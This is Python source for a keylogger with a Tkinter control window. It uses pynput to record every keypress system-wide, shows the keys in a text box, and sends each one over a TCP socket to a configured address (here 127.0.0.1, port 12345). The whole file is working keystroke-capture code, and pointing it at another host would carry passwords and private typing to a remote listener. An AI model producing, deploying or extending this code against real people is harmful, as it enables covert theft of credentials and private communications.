import tkinter as tk
import socket
from threading import Thread
from pynput import keyboard

# Define constants
IP = '127.0.0.1'
PORT = 12345

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        
        self.status_label = tk.Label(root, text="Host Status: Inactive")
        self.status_label.pack()

        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack()

        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack()

        # Create the logs_text widget with text wrapping enabled
        self.logs_text = tk.Text(root, wrap=tk.WORD)
        self.logs_text.pack()

        self.keylogger_listener = None
        self.is_backspace_pressed = False

    def start_keylogger(self):
        self.keylogger_thread = Thread(target=self.run_keylogger)
        self.keylogger_thread.start()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_label.config(text="Host Status: Active")
        self.root.config(bg='green')  # Set background color to green when active

    def stop_keylogger(self):
        if self.keylogger_listener:
            self.keylogger_listener.stop()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.status_label.config(text="Host Status: Inactive")
        self.root.config(bg='red')  # Set background color to red when inactive

    def on_press(self, key):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((IP, PORT))
                # Handle Backspace key
                if key == keyboard.Key.backspace:
                    self.is_backspace_pressed = True
                    return
                # Insert the next key inside double quotes if Backspace was pressed
                elif self.is_backspace_pressed:
                    s.send(f'"{key}"'.encode())
                    self.is_backspace_pressed = False
                else:
                    s.send(str(key).encode())
                # Update logs_text widget with the received key
                if key == keyboard.Key.space:
                    self.logs_text.insert(tk.END, ' ')
                else:
                    key_str = str(key).replace("'", "")
                    self.logs_text.insert(tk.END, key_str)
                self.logs_text.see(tk.END)  # Scroll to the end of the text widget
        except Exception as e:
            print("Error sending key:", e)

    def run_keylogger(self):
        self.keylogger_listener = keyboard.Listener(on_press=self.on_press)
        self.keylogger_listener.start()

def main():
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
